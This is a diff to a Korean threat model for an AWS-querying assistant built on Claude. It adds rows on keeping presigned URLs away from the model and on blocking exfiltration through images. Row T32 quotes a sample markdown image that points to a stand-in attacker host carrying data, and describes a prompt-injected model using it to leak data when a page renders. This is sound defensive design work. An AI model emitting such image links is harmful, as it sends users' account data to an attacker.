@@ -96,13 +96,15 @@ WGA는 사용자가 자연어로 AWS 계정을 조회하고 일부를 바꾸는 
 | T28 | 조회 권한이 넓어 역할이 새면 피해가 크다 | 서버마다 쓰는 동작만 준다 | `tests/test_network_server.py::test_mcp_role_gets_only_ec2_describe`, `tests/test_cloudtrail.py::test_mcp_role_can_only_look_up_events`, `tests/test_pricing.py::test_mcp_role_gets_only_price_lookup_permissions` |
 | T29 | 저장소에 비밀 값이 올라간다 (공개 저장소) | 실제 발급 형식의 문자열이 없는지 검사한다 | `tests/test_secret_patterns.py::test_no_secret_shaped_strings_in_repository` |
 | T30 | 차트 데이터가 계정 밖의 차트 서버로 나간다 (예전에는 외부 차트 서버로 보냈다) | 차트 15종을 MCP Lambda 안에서 matplotlib으로 그려 다이어그램 버킷에 올린다. 결과물 도구(차트·다이어그램)에는 가명을 원래 값으로 되돌리지 않는다 (AWS를 부르지 않으므로 원래 값이 필요 없다) | `tests/test_charts.py::test_chart_code_has_no_way_out`, `tests/test_charts.py::test_chart_is_drawn_here_and_uploaded_to_our_bucket`, `tests/test_charts.py::test_chart_tools_get_pseudonyms_but_lookups_get_real_values` |
+| T31 | 결과물 주소(presigned URL)에 든 임시 자격 증명의 키 ID·계정 ID가 Claude로 나간다 (가려서 보내면 주소가 망가져 이미지가 열리지 않았다) | 모델에는 `artifact://` 참조만 주고, 주소와 차트 데이터는 LLM Lambda가 답변 정보(`inference.artifacts`)로 화면에 준다. Slack은 보낼 때 실제 주소로 바꾼다 | `tests/test_artifacts.py::test_chart_reaches_the_screen_but_not_the_model`, `tests/test_artifacts.py::test_model_gets_a_ref_and_the_screen_gets_url_and_spec`, `tests/test_artifacts.py::test_slack_gets_real_urls` |
+| T32 | 인젝션에 넘어간 모델이 답변에 바깥 이미지(`![](https://공격자/?d=데이터)`)를 넣어, 화면이 열자마자 데이터가 나간다 | 화면은 서버가 준 결과물(`inference.artifacts`)만 이미지로 연다. 모델이 쓴 이미지 주소는 누를 수 있는 링크로만 보인다 (버킷 이름 모양으로 허용하지 않는다: S3 버킷 이름은 누구나 만들 수 있다). 차트는 번들에 넣은 ECharts로 그려 밖으로 요청하지 않는다 | `tests/test_artifacts.py::test_screen_never_opens_images_the_model_wrote` (정적 확인: 프런트엔드 테스트 도구가 없다) |
 
 ### 감사 기록
 
 | # | 위협 | 방어 | 테스트 |
 |:--|:--|:--|:--|
-| T31 | 감사 기록을 고치거나 지운다 | 쓰기는 `attribute_not_exists`로 덧붙이기만 하고, LLM 역할에는 PutItem·Query만 준다. CloudWatch Logs(365일)에도 같은 기록을 남긴다. 테이블은 PITR | `tests/test_audit.py::test_records_are_append_only`, `tests/test_audit.py::test_llm_role_can_only_append_and_read_audit_records`, `tests/test_audit.py::test_audit_records_are_also_written_to_cloudwatch_logs` |
-| T32 | 도구 호출이 기록되지 않는다 | 도구마다 실제로 받은 값(비밀 값만 가림)으로 기록한다 | `tests/test_audit.py::test_each_tool_call_is_recorded_with_the_value_the_tool_received`, `tests/test_audit.py::test_slack_requests_are_recorded_by_slack_user` |
+| T33 | 감사 기록을 고치거나 지운다 | 쓰기는 `attribute_not_exists`로 덧붙이기만 하고, LLM 역할에는 PutItem·Query만 준다. CloudWatch Logs(365일)에도 같은 기록을 남긴다. 테이블은 PITR | `tests/test_audit.py::test_records_are_append_only`, `tests/test_audit.py::test_llm_role_can_only_append_and_read_audit_records`, `tests/test_audit.py::test_audit_records_are_also_written_to_cloudwatch_logs` |
+| T34 | 도구 호출이 기록되지 않는다 | 도구마다 실제로 받은 값(비밀 값만 가림)으로 기록한다 | `tests/test_audit.py::test_each_tool_call_is_recorded_with_the_value_the_tool_received`, `tests/test_audit.py::test_slack_requests_are_recorded_by_slack_user` |
 
 ## 5. 남은 위험
 
